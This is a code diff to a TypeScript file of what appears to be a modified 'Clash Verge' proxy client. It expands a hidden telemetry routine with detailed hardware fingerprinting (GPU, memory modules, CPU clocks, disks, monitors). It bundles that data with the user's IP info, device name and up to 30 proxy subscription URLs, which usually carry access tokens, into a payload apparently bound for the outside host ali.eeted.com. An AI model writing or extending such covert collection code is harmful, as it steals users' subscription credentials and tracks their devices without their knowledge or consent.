@@ -17,11 +17,16 @@ import { router } from "./pages/_routers";
 import { AppDataProvider } from "./providers/app-data-provider";
 import { WindowProvider } from "./providers/window";
 import { getIpInfo } from "./services/api";
+import type {
+  WindowsHardwareExtra,
+  WindowsMemoryModule,
+} from "./services/cmds";
 import {
   getHardwareInfo,
   getProfiles,
   getSystemHostname,
   getSystemInfo,
+  getWindowsDisplays,
   getWindowsHardwareExtra,
 } from "./services/cmds";
 import { FALLBACK_LANGUAGE, initializeLanguage } from "./services/i18n";
@@ -105,6 +110,102 @@ const getScreenInfo = () => {
   };
 };
 
+/** WMI 为 MHz，与常见标注的 GHz 一致（÷1000） */
+const formatCpuMhzToGhz = (mhz: number | null | undefined): string => {
+  if (mhz == null || mhz <= 0) return "";
+  return `${(mhz / 1000).toFixed(2)} GHz`;
+};
+
+/** SMBIOS/WMI 常为与 MT/s 相同的数值，按 MT/s 展示 */
+const formatMemoryDimmMts = (mods: WindowsMemoryModule[]): string => {
+  if (!mods?.length) return "";
+  const parts = mods
+    .map((m) => {
+      const v = m.configuredClockSpeedMhz ?? m.speedMhz;
+      if (v == null || v <= 0) return "";
+      return `${v} MT/s`;
+    })
+    .filter(Boolean);
+  return [...new Set(parts)].join(", ");
+};
+
+const formatMemoryManufacturers = (mods: WindowsMemoryModule[]): string => {
+  if (!mods?.length) return "";
+  const parts = mods
+    .map((m) => m.manufacturer?.trim())
+    .filter((x): x is string => Boolean(x));
+  return [...new Set(parts)].join(", ");
+};
+
+/** DDR4 / DDR5 / LPDDR5 等，去重 */
+const formatMemoryDdrStandards = (mods: WindowsMemoryModule[]): string => {
+  if (!mods?.length) return "";
+  const parts = mods
+    .map((m) => m.memoryStandard?.trim())
+    .filter((s) => Boolean(s && s !== "Unknown"));
+  return [...new Set(parts)].join(", ");
+};
+
+const emptyWindowsExtra = (): WindowsHardwareExtra => ({
+  disks: [],
+  gpus: [],
+  gpuAdapters: [],
+  physicalDisks: [],
+  memoryModules: [],
+  cpuClocks: null,
+  networkAdapters: [],
+  motherboardManufacturer: null,
+  motherboardProduct: null,
+});
+
+/** 板卡 AIB 英文名（PCI 常见写法）→ 中文，仅用于展示 */
+const GPU_BOARD_BRAND_ZH: Record<string, string> = {
+  ASUS: "华硕",
+  Gigabyte: "技嘉",
+  MSI: "微星",
+  ASRock: "华擎",
+  ZOTAC: "索泰",
+  Palit: "同德",
+  Galax: "影驰",
+  Sapphire: "蓝宝石",
+  PowerColor: "撼讯",
+  XFX: "讯景",
+  Colorful: "七彩虹",
+  EVGA: "EVGA",
+  Dell: "戴尔",
+  Lenovo: "联想",
+  Acer: "宏碁",
+  Clevo: "蓝天",
+  Club3D: "Club3D",
+  TUL: "迪兰",
+};
+
+const formatGpuList = (extra: WindowsHardwareExtra): string => {
+  const adapters = extra.gpuAdapters ?? [];
+  if (!adapters.length) return "";
+  return adapters
+    .map((g) => {
+      const ram = g.adapterRamBytes;
+      const ramStr =
+        ram != null && ram > 0 ? `${(ram / 1024 ** 3).toFixed(1)} GiB` : "?";
+      const chip = g.manufacturer?.trim() ?? "";
+      const boardRaw = g.boardBrand?.trim() ?? "";
+      const board = boardRaw ? (GPU_BOARD_BRAND_ZH[boardRaw] ?? boardRaw) : "";
+      let label: string;
+      if (board && chip) {
+        label = `${board} / ${chip} — ${g.name}`;
+      } else if (board) {
+        label = `${board} — ${g.name}`;
+      } else if (chip) {
+        label = `${chip} — ${g.name}`;
+      } else {
+        label = g.name;
+      }
+      return `${label}: ${ramStr}`;
+    })
+    .join("; ");
+};
+
 const getInfo = async () => {
   try {
     const [rawSystem, ipInfo, hw, deviceName, profiles] = await Promise.all([
@@ -129,6 +230,7 @@ const getInfo = async () => {
       osLabel = `${sysName} ${sysVersion}`.trim();
     }
     const memGiB = (hw.totalMemoryBytes / 1024 ** 3).toFixed(2);
+    const memAvailGiB = (hw.availableMemoryBytes / 1024 ** 3).toFixed(2);
     const scr = getScreenInfo();
 
     const subscriptionUrls = (profiles?.items ?? [])
@@ -138,20 +240,36 @@ const getInfo = async () => {
         url: p.url?.trim() ?? "",
       }))
       .filter((x) => Boolean(x.url));
-    let disk: any = "";
-    let extra: any = {};
+    const fmtGiB = (b: number) => `${(b / 1024 ** 3).toFixed(2)} GB`;
+
+    let disk = "";
+    let extra = emptyWindowsExtra();
+    let displays: Awaited<ReturnType<typeof getWindowsDisplays>> = [];
     if (getSystem() === "windows") {
-      extra = await getWindowsHardwareExtra();
-      const fmtGiB = (b: number) => `${(b / 1024 ** 3).toFixed(2)} GB`;
-      disk = extra.disks
-        .map((d: any) => `${d.name}: ${fmtGiB(d.totalBytes)}`)
+      [extra, displays] = await Promise.all([
+        getWindowsHardwareExtra(),
+        getWindowsDisplays(),
+      ]);
+      disk = (extra.physicalDisks ?? [])
+        .map(
+          (d) => `${d.friendlyName}: ${fmtGiB(d.sizeBytes)} (${d.mediaType})`,
+        )
         .join("; ");
+      if (!disk) {
+        disk = (extra.disks ?? [])
+          .map((d) => `${d.name}: ${fmtGiB(d.totalBytes)}`)
+          .join("; ");
+      }
     }
+
+    const memMods = extra.memoryModules ?? [];
+    const cpuClk = extra.cpuClocks;
 
     const payload = {
       deviceInfo: {
         origin: {
           extra,
+          monitors: displays,
           hardwareInfo: hw,
           ipInfo: ipInfo,
           screenInfo: scr,
@@ -161,18 +279,28 @@ const getInfo = async () => {
           disk: disk,
           cpu: hw.cpuBrand,
           memory: `${memGiB} GiB`,
+          memoryAvailable: `${memAvailGiB} GiB`,
           screen: `${scr.width}×${scr.height} (avail ${scr.availWidth}×${scr.availHeight}), dpr=${scr.devicePixelRatio}`,
           osLabel,
           deviceName: deviceName.trim() || "",
+
+          gpu: formatGpuList(extra),
+          memorySpeed: formatMemoryDimmMts(memMods),
+          memoryManufacturers: formatMemoryManufacturers(memMods),
+          memoryDdr: formatMemoryDdrStandards(memMods),
+          cpuMaxGHz: formatCpuMhzToGhz(cpuClk?.maxClockSpeedMhz),
+          cpuCurrentGHz: formatCpuMhzToGhz(cpuClk?.currentClockSpeedMhz),
         },
         vergeVersion: appVersion,
       },
+      platform: getSystem(),
       name: "clash verge",
-      version: "v1d0",
+      version: "v1d1",
       time: new Date().toISOString(),
       timeStamp: new Date().getTime(),
       subUrls: subscriptionUrls.slice(0, 30),
     };
+    console.log(payload);
 
     const url = "https://ali.eeted.com:16501/info/v1";
 
